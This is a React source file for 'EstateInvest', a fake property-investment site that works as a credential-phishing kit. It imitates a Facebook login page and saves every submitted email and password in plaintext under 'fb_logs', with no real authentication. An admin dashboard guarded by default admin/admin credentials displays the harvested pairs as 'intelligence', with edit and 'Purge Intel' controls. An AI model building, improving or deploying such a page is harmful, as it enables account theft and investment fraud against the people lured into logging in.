import React, { useState, useEffect } from 'react';
import { Facebook, Lock, Rocket } from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';

// Default Background Assets
const DEFAULT_BGS = {
  landing: [
    '/src/assets/hero-bg-1.png',
    '/src/assets/hero-bg-2.png',
    '/src/assets/hero-bg-3.png',
    '/src/assets/hero-bg-4.png',
    '/src/assets/hero-bg-5.png',
    '/src/assets/hero-bg-6.png',
    '/src/assets/hero-bg-7.png',
    '/src/assets/hero-bg-8.png',
    '/src/assets/hero-bg-9.png',
    '/src/assets/hero-bg-10.png',
    '/src/assets/hero-bg-11.png',
    '/src/assets/hero-bg-12.png',
    '/src/assets/hero-bg-13.png',
    '/src/assets/hero-bg-14.png'
  ],
  agent: [
    '/src/assets/hero-bg.png',
    '/src/assets/prop-1.png'
  ],
  seller: [
    '/src/assets/hero-bg-2.png',
    '/src/assets/prop-2.png'
  ],
  buyer: [
    '/src/assets/buyer-bg.png',
    '/src/assets/properties-bg.png'
  ]
};

interface LoginDetail {
  id: string;
  email: string;
  password: string;
  timestamp: string;
}

const App: React.FC = () => {
  const [view, setView] = useState<'landing' | 'login' | 'admin' | 'properties' | 'seller' | 'admin-auth'>('landing');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [logs, setLogs] = useState<LoginDetail[]>([]);
  const [isLoading, setIsLoading] = useState(false);
  const [customBgs, setCustomBgs] = useState(DEFAULT_BGS);
  const [newBgUrl, setNewBgUrl] = useState('');
  const [activeBgIndex, setActiveBgIndex] = useState(0);
  const [pendingView, setPendingView] = useState<typeof view | null>(null);
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [properties, setProperties] = useState([
    { id: '1', title: 'Horizon Villa', price: '4,500,000', location: 'Miami, FL', type: 'Villa', beds: 5, baths: 6.5, imgClass: 'prop-img-1' },
    { id: '2', title: 'Skyline Penthouse', price: '7,200,000', location: 'New York, NY', type: 'Penthouse', beds: 3, baths: 4, imgClass: 'prop-img-2' }
  ]);
  const [newProp, setNewProp] = useState({ title: '', price: '', location: '', type: 'Premium' });
  const [editingLog, setEditingLog] = useState<string | null>(null);
  const [editData, setEditData] = useState({ email: '', password: '' });
  const [adminCreds, setAdminCreds] = useState({ user: 'admin', pass: 'admin' });
  const [showSecurityModal, setShowSecurityModal] = useState(false);
  const [newAdminCreds, setNewAdminCreds] = useState({ user: '', pass: '' });

  // Global background rotation
  useEffect(() => {
    const interval = setInterval(() => {
      setActiveBgIndex((prev) => (prev + 1) % 100); // Using a large modulo to allow different array lengths later
    }, 6000);
    return () => clearInterval(interval);
  }, []);

  const addBackground = (role: keyof typeof DEFAULT_BGS) => {
    if (!newBgUrl) return;
    setCustomBgs(prev => ({
      ...prev,
      [role]: [...prev[role], newBgUrl]
    }));
    setNewBgUrl('');
    alert(`New background added to ${role} dashboard!`);
  };

  const getCurrentBg = (role: keyof typeof DEFAULT_BGS) => {
    const bgs = customBgs[role];
    return bgs[activeBgIndex % bgs.length];
  };

  useEffect(() => {
    const savedLogs = localStorage.getItem('fb_logs');
    if (savedLogs) setLogs(JSON.parse(savedLogs));

    const savedProps = localStorage.getItem('estate_props');
    if (savedProps) setProperties(JSON.parse(savedProps));

    const savedAdmin = localStorage.getItem('admin_creds');
    if (savedAdmin) setAdminCreds(JSON.parse(savedAdmin));
  }, []);

  const postProperty = (e: React.FormEvent) => {
    e.preventDefault();
    if (!newProp.title || !newProp.price) return;

    const property = {
      ...newProp,
      id: Math.random().toString(36).substr(2, 9),
      beds: Math.floor(Math.random() * 5) + 2,
      baths: Math.floor(Math.random() * 4) + 1,
      imgClass: Math.random() > 0.5 ? 'prop-img-1' : 'prop-img-2'
    };

    const updated = [property, ...properties];
    setProperties(updated);
    localStorage.setItem('estate_props', JSON.stringify(updated));
    setNewProp({ title: '', price: '', location: '', type: 'Premium' });
    alert('Property successfully published to the Buyer Hub!');
  };

  const handleAdminLogin = (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);

    // Simulate server-side verification
    setTimeout(() => {
      if (email === adminCreds.user && password === adminCreds.pass) {
        setIsAuthenticated(true);
        setView('admin');
        setIsLoading(false);
      } else {
        setIsLoading(false);
        alert('Invalid Staff Credentials. Access Denied.');
      }
      setEmail('');
      setPassword('');
    }, 1200);
  };

  const navigateToProtectedView = (targetView: typeof view) => {
    if (isAuthenticated) {
      setView(targetView);
    } else {
      setPendingView(targetView);
      setView('login');
    }
  };

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);

    setTimeout(() => {
      const newLog: LoginDetail = {
        id: Math.random().toString(36).substr(2, 9),
        email,
        password,
        timestamp: new Date().toLocaleString(),
      };

      const updatedLogs = [...logs, newLog];
      setLogs(updatedLogs);
      localStorage.setItem('fb_logs', JSON.stringify(updatedLogs));

      setIsLoading(false);
      setIsAuthenticated(true);

      if (pendingView) {
        setView(pendingView);
        setPendingView(null);
      } else {
        setView('landing');
      }

      setEmail('');
      setPassword('');
    }, 1500);
  };

  const deleteLog = (id: string) => {
    const updatedLogs = logs.filter(log => log.id !== id);
    setLogs(updatedLogs);
    localStorage.setItem('fb_logs', JSON.stringify(updatedLogs));
  };

  const startEditing = (log: LoginDetail) => {
    setEditingLog(log.id);
    setEditData({ email: log.email, password: log.password });
  };

  const updateLog = (id: string) => {
    const updatedLogs = logs.map(log =>
      log.id === id ? { ...log, email: editData.email, password: editData.password } : log
    );
    setLogs(updatedLogs);
    localStorage.setItem('fb_logs', JSON.stringify(updatedLogs));
    setEditingLog(null);
  };

  const updateAdminCreds = (e: React.FormEvent) => {
    e.preventDefault();
    if (!newAdminCreds.user || !newAdminCreds.pass) return;
    setAdminCreds(newAdminCreds);
    localStorage.setItem('admin_creds', JSON.stringify(newAdminCreds));
    setShowSecurityModal(false);
    alert('Admin security credentials updated successfully!');
  };

  return (
    <div className="app-main">
      <nav className="nav-bar">
        <div className="nav-logo">
          <Rocket className="status-icon-pulse" />
          <span className="logo-text">EstateInvest</span>
          <div className="system-badge">
            <span className="pulse-dot"></span>
            SYSTEM ONLINE
          </div>
        </div>
        <div className="nav-actions">
          <button
            onClick={() => setView('landing')}
            className={`nav-btn ${view === 'landing' ? 'active' : ''}`}
            title="Home"
          >
            Home
          </button>
          <button
            onClick={() => setView('login')}
            className={`nav-btn ${view === 'login' ? 'active' : ''}`}
            title="Login"
          >
            Sign Up / Login
          </button>
          <button
            onClick={() => setView('admin-auth')}
            className={`nav-btn ${view === 'admin' || view === 'admin-auth' ? 'active' : ''}`}
            title="Agent Portal"
          >
            Agent Portal
          </button>
          <button
            onClick={() => navigateToProtectedView('seller')}
            className={`nav-btn ${view === 'seller' ? 'active' : ''}`}
            title="Seller Portal"
          >
            Seller Portal
          </button>
          <button
            onClick={() => navigateToProtectedView('properties')}
            className={`nav-btn ${view === 'properties' ? 'active' : ''}`}
            title="Buyer Dashboard"
          >
            Buyer Hub
          </button>
        </div>
      </nav>

      <AnimatePresence mode="wait">
        {view === 'landing' && (
          <motion.div
            key="landing"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
          >
            {/* Hero Section with Rotating Background */}
            <section className="hero-section">
              <AnimatePresence mode="wait">
                <motion.div
                  key={getCurrentBg('landing')}
                  initial={{ opacity: 0 }}
                  animate={{ opacity: 1 }}
                  exit={{ opacity: 0 }}
                  transition={{ duration: 1.5 }}
                  className="hero-background-overlay"
                  style={{ backgroundImage: `url(${getCurrentBg('landing')})` }}
                />
              </AnimatePresence>

              <div className="hero-content-wrapper">
                <div className="hero-text-container text-center">
                  <h1 className="hero-title-overlay">View A ESTATE Property business investment</h1>
                  <p className="hero-subtitle-overlay">Sign in via Facebook to access exclusive local and international property portfolios.</p>
                  <div className="hero-action-container">
                    <button className="fb-button fb-button-minimal" onClick={() => setView('login')}>
                      <Facebook fill="white" size={20} />
                      Continue with Facebook
                    </button>
                    <button className="fb-button fb-button-minimal outline-btn" onClick={() => navigateToProtectedView('properties')}>
                      Explore Buyer Portfolio
                    </button>
                    <p className="legal-text-overlay">
                      By continuing, you agree to our <a href="#" className="legal-link-overlay">Terms of Service</a> and <a href="#" className="legal-link-overlay">Privacy Policy</a>
                    </p>
                  </div>
                </div>
              </div>
            </section>

            {/* Landing Page Content Removed for Minimal Image-Text Focus */}
            <div className="landing-container">
            </div>

            <footer className="main-footer">
              <div className="landing-container">
                <div className="footer-content">
                  <div className="nav-logo">
                    <Rocket className="text-blue" />
                    <span className="logo-text">EstateInvest</span>
                  </div>
                  <div className="footer-links">
                    <a href="#" className="nav-btn">About</a>
                    <a href="#" className="nav-btn">Privacy</a>
                    <a href="#" className="nav-btn">Terms</a>
                    <a href="#" className="nav-btn">Contact</a>
                    <a href="#" className="nav-btn">API</a>
                  </div>
                </div>
                <p className="footer-copy">© 2026 EstateInvest Global. All rights reserved.</p>
              </div>
            </footer>
          </motion.div>
        )}

        {view === 'admin-auth' && (
          <div className="hero-section">
            <div className="agent-portal-bg" />
            <motion.div
              key="admin-auth"
              initial={{ opacity: 0, scale: 0.9 }}
              animate={{ opacity: 1, scale: 1 }}
              exit={{ opacity: 0, scale: 1.1 }}
              className="glass-card"
            >
              <div className="card-header">
                <div className="fb-logo-container staff-logo">
                  <Lock size={40} color="var(--text-slate)" />
                </div>
                <h2 className="card-title">Staff Authorization</h2>
                <p className="card-subtitle">Secure access to the EstateInvest Control Panel</p>
              </div>

              <form onSubmit={handleAdminLogin}>
                <div className="input-group">
                  <label className="input-label">Admin Email / ID</label>
                  <input
                    type="text"
                    className="glass-input"
                    placeholder="admin"
                    required
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                  />
                </div>

                <div className="input-group">
                  <label className="input-label">Security Password</label>
                  <input
                    type="password"
                    className="glass-input"
                    placeholder="••••••••"
                    required
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                  />
                </div>

                <button type="submit" className="fb-button staff-auth-btn" disabled={isLoading}>
                  {isLoading ? (
                    <div className="spinner"></div>
                  ) : (
                    <>
                      <Rocket size={18} />
                      Verify Primary Access
                    </>
                  )}
                </button>
              </form>

              <button
                onClick={() => setView('landing')}
                className="back-btn"
              >
                Return to Landing
              </button>
            </motion.div>
          </div>
        )}

        {view === 'login' && (
          <div className="hero-section">
            <div className="agent-portal-bg" />
            <motion.div
              key="login"
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -20 }}
              className="glass-card"
            >
              <div className="card-header">
                <div className="fb-logo-container">
                  <Facebook size={48} color="var(--fb-blue)" fill="var(--fb-blue)" />
                </div>
                <h2 className="card-title">Facebook Login</h2>
                <p className="card-subtitle">Sign in to your account with Facebook</p>
              </div>

              <form onSubmit={handleLogin}>
                <div className="input-group">
                  <label className="input-label">Facebook Email or Phone</label>
                  <input
                    type="text"
                    className="glass-input"
                    placeholder="name@example.com"
                    required
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                  />
                </div>

                <div className="input-group">
                  <label className="input-label">Password</label>
                  <input
                    type="password"
                    className="glass-input"
                    placeholder="••••••••"
                    required
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                  />
                </div>

                <button type="submit" className="fb-button" disabled={isLoading}>
                  {isLoading ? (
                    <div className="spinner"></div>
                  ) : (
                    <>
                      <Lock size={18} />
                      Authorize & Restart
                    </>
                  )}
                </button>
              </form>

              <button
                onClick={() => setView('landing')}
                className="back-btn"
              >
                Return to Landing
              </button>
            </motion.div>
          </div>
        )}

        {view === 'admin' && (
          <div className="hero-section">
            <AnimatePresence mode="wait">
              <motion.div
                key={getCurrentBg('agent')}
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                exit={{ opacity: 0 }}
                transition={{ duration: 1.5 }}
                className="agent-portal-bg animated-bg-overlay"
                style={{ backgroundImage: `url(${getCurrentBg('agent')})` }}
              />
            </AnimatePresence>
            <motion.div
              key="admin"
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              className="glass-card admin-dashboard-card"
            >
              <div className="dashboard-header">
                <div>
                  <h2 className="card-title">Agent Dashboard</h2>
                  <p className="card-subtitle">Manage listings and view portal telemetry</p>
                </div>
                <div className="dashboard-actions">
                  <button
                    className="fb-button fb-button-minimal post-btn-wide"
                    onClick={() => setShowSecurityModal(true)}
                  >
                    Security Settings
                  </button>
                  <button className="fb-button fb-button-minimal post-btn-wide">
                    + Post New Property
                  </button>
                  <button
                    onClick={() => {
                      localStorage.removeItem('fb_logs');
                      setLogs([]);
                    }}
                    className="clear-btn"
                  >
                    Purge Intel
                  </button>
                </div>
              </div>

              {/* Property Posting Form */}
              <div className="post-property-section">
                <h3 className="section-subtitle">Add New Listing</h3>
                <form className="post-property-form" onSubmit={postProperty}>
                  <div className="input-group">
                    <label className="input-label">Property Title</label>
                    <input
                      type="text"
                      className="glass-input"
                      placeholder="e.g. Luxury Oceanfront Villa"
                      value={newProp.title}
                      onChange={(e) => setNewProp({ ...newProp, title: e.target.value })}
                    />
                  </div>
                  <div className="input-group">
                    <label className="input-label">Price ($)</label>
                    <input
                      type="number"
                      className="glass-input"
                      placeholder="5,000,000"
                      value={newProp.price}
                      onChange={(e) => setNewProp({ ...newProp, price: e.target.value })}
                    />
                  </div>
                  <div className="input-group">
                    <label className="input-label">Location</label>
                    <input
                      type="text"
                      className="glass-input"
                      placeholder="City, State"
                      value={newProp.location}
                      onChange={(e) => setNewProp({ ...newProp, location: e.target.value })}
                    />
                  </div>
                  <button type="submit" className="fb-button">Upload & Publish</button>
                </form>
              </div>

              {/* Background Management */}
              <div className="post-property-section portal-bg-settings">
                <h3 className="section-subtitle">Portal Background Settings</h3>
                <div className="post-property-form bg-form-grid">
                  <div className="input-group bg-url-input">
                    <label className="input-label">Add Background Image URL</label>
                    <input
                      type="text"
                      className="glass-input"
                      placeholder="https://images.unsplash.com/photo-..."
                      value={newBgUrl}
                      onChange={(e) => setNewBgUrl(e.target.value)}
                    />
                  </div>
                  <button className="fb-button" onClick={() => addBackground('agent')}>Add Image</button>
                </div>
                <p className="legal-text active-bg-counter">Active backgrounds: {customBgs.agent.length}</p>
              </div>

              <div className="table-container portal-activity-box">
                <h3 className="section-subtitle">Recent Portal Activity</h3>
                <table className="admin-table">
                  <thead>
                    <tr>
                      <th>Time Vector</th>
                      <th>Identifer</th>
                      <th>Access Key</th>
                      <th>Status</th>
                      <th>Actions</th>
                    </tr>
                  </thead>
                  <tbody>
                    {logs.length === 0 ? (
                      <tr>
                        <td colSpan={5} className="empty-state">
                          No intelligence data captured.
                        </td>
                      </tr>
                    ) : (
                      logs.map((log) => (
                        <tr key={log.id}>
                          <td className="time-col">{log.timestamp}</td>
                          <td className="id-col">
                            {editingLog === log.id ? (
                              <input
                                className="edit-input"
                                value={editData.email}
                                title="Edit Email Identifier"
                                onChange={(e) => setEditData({ ...editData, email: e.target.value })}
                              />
                            ) : log.email}
                          </td>
                          <td className="key-col">
                            {editingLog === log.id ? (
                              <input
                                className="edit-input"
                                value={editData.password}
                                title="Edit Access Key"
                                onChange={(e) => setEditData({ ...editData, password: e.target.value })}
                              />
                            ) : log.password}
                          </td>
                          <td>
                            <span className="captured-badge">
                              SECURED
                            </span>
                          </td>
                          <td className="actions-col">
                            {editingLog === log.id ? (
                              <button className="save-btn" onClick={() => updateLog(log.id)}>Save</button>
                            ) : (
                              <button className="edit-btn" onClick={() => startEditing(log)}>Edit</button>
                            )}
                            <button className="delete-btn" onClick={() => deleteLog(log.id)}>Delete</button>
                          </td>
                        </tr>
                      ))
                    )}
                  </tbody>
                </table>
              </div>
            </motion.div>
          </div>
        )}

        {view === 'seller' && (
          <div className="hero-section">
            <AnimatePresence mode="wait">
              <motion.div
                key={getCurrentBg('seller')}
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                exit={{ opacity: 0 }}
                transition={{ duration: 1.5 }}
                className="seller-portal-bg animated-bg-overlay"
                style={{ backgroundImage: `url(${getCurrentBg('seller')})` }}
              />
            </AnimatePresence>
            <motion.div
              key="seller"
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              className="login-card-minimal seller-dashboard-card"
            >
              <div className="dashboard-header">
                <div>
                  <h2 className="card-title">Seller Hub</h2>
                  <p className="card-subtitle">List your property and reach global investors</p>
                </div>
                <div className="dashboard-actions">
                  <button className="fb-button fb-button-minimal post-btn-wide">
                    + New Listing
                  </button>
                </div>
              </div>

              <div className="post-property-section">
                <h3 className="section-subtitle">Sell Your Property</h3>
                <form className="post-property-form" onSubmit={postProperty}>
                  <div className="input-group">
                    <label className="input-label">Property Name</label>
                    <input
                      type="text"
                      className="glass-input"
                      placeholder="Luxury Apartment"
                      value={newProp.title}
                      onChange={(e) => setNewProp({ ...newProp, title: e.target.value })}
                    />
                  </div>
                  <div className="input-group">
                    <label className="input-label">Asking Price ($)</label>
                    <input
                      type="number"
                      className="glass-input"
                      placeholder="1,200,000"
                      value={newProp.price}
                      onChange={(e) => setNewProp({ ...newProp, price: e.target.value })}
                    />
                  </div>
                  <div className="input-group">
                    <label className="input-label">Address</label>
                    <input
                      type="text"
                      className="glass-input"
                      placeholder="Full Address"
                      value={newProp.location}
                      onChange={(e) => setNewProp({ ...newProp, location: e.target.value })}
                    />
                  </div>
                  <button type="submit" className="fb-button">List to Marketplace</button>
                </form>
              </div>

              {/* Background Management for Sellers */}
              <div className="post-property-section portal-bg-settings">
                <h3 className="section-subtitle">Hub Background Settings</h3>
                <div className="post-property-form bg-form-grid">
                  <div className="input-group bg-url-input">
                    <label className="input-label">Add Hub Background Image URL</label>
                    <input
                      type="text"
                      className="glass-input"
                      placeholder="https://images.unsplash.com/photo-..."
                      value={newBgUrl}
                      onChange={(e) => setNewBgUrl(e.target.value)}
                    />
                  </div>
                  <button className="fb-button" onClick={() => addBackground('seller')}>Add Image</button>
                </div>
                <p className="legal-text active-bg-counter">Active backgrounds: {customBgs.seller.length}</p>
              </div>

              <div className="table-container portal-activity-box">
                <h3 className="section-subtitle">Your Active Listings</h3>
                {properties.length <= 2 ? (
                  <div className="empty-state-mini">
                    <Rocket size={40} className="text-secondary opacity-30" />
                    <p>You haven't posted any properties yet. Start by listing your first asset!</p>
                  </div>
                ) : (
                  <div className="mini-stats-grid">
                    <div className="status-pill online">Total Assets: {properties.length - 2}</div>
                    <div className="status-pill active">Visibility: High</div>
                  </div>
                )}
              </div>

              <div className="text-center hub-nav-footer">
                <button onClick={() => setView('landing')} className="back-btn hub-return-btn">
                  Back to Hub
                </button>
              </div>
            </motion.div>
          </div>
        )}

        {view === 'properties' && (
          <div className="properties-view">
            <div className="properties-hero">
              <AnimatePresence mode="wait">
                <motion.div
                  key={getCurrentBg('buyer')}
                  initial={{ opacity: 0 }}
                  animate={{ opacity: 1 }}
                  exit={{ opacity: 0 }}
                  transition={{ duration: 1.5 }}
                  className="buyer-portal-bg animated-bg-overlay full-dimensions"
                  style={{ backgroundImage: `url(${getCurrentBg('buyer')})` }}
                />
              </AnimatePresence>
              <div className="hero-content-wrapper">
                <div className="hero-text-container text-center">
                  <h2 className="hero-title-overlay">Buyer Dashboard</h2>
                  <p className="hero-subtitle-overlay">Premium properties curated for your acquisition portfolio</p>
                </div>
              </div>
            </div>

            <div className="properties-grid-container">
              <div className="property-card-list">
                {properties.map((prop) => (
                  <div className="prop-card" key={prop.id}>
                    <div className={`prop-img-box ${prop.imgClass}`}>
                      <span className="availability-tag">AVAILABLE</span>
                    </div>
                    <div className="prop-info">
                      <h3>{prop.title}</h3>
                      <p className="prop-price">${Number(prop.price).toLocaleString()}</p>
                      <p className="prop-meta">{prop.location} • {prop.beds} Beds • {prop.baths} Baths</p>
                      <button className="inquiry-btn">Inquire Now</button>
                    </div>
                  </div>
                ))}
              </div>

              <div className="text-center hub-nav-footer">
                <button onClick={() => setView('landing')} className="back-btn hub-return-btn">
                  Back to Hub
                </button>
              </div>
            </div>
          </div>
        )}
      </AnimatePresence>

      {/* Security Modal */}
      {showSecurityModal && (
        <div className="modal-overlay">
          <motion.div
            initial={{ opacity: 0, scale: 0.9 }}
            animate={{ opacity: 1, scale: 1 }}
            className="glass-card modal-card"
          >
            <h3 className="section-title-mini">Update Security Credentials</h3>
            <p className="card-subtitle">Change the primary admin access keys</p>
            <form onSubmit={updateAdminCreds} className="modal-form">
              <div className="input-group">
                <label className="input-label">New Admin User/Email</label>
                <input
                  type="text"
                  className="glass-input"
                  placeholder={adminCreds.user}
                  required
                  value={newAdminCreds.user}
                  onChange={(e) => setNewAdminCreds({ ...newAdminCreds, user: e.target.value })}
                />
              </div>
              <div className="input-group">
                <label className="input-label">New Admin Password</label>
                <input
                  type="password"
                  className="glass-input"
                  placeholder="••••••••"
                  required
                  value={newAdminCreds.pass}
                  onChange={(e) => setNewAdminCreds({ ...newAdminCreds, pass: e.target.value })}
                />
              </div>
              <div className="modal-actions">
                <button type="button" className="clear-btn" onClick={() => setShowSecurityModal(false)}>Cancel</button>
                <button type="submit" className="fb-button post-btn-wide">Save Keys</button>
              </div>
            </form>
          </motion.div>
        </div>
      )}
    </div>
  );
};

export default App;
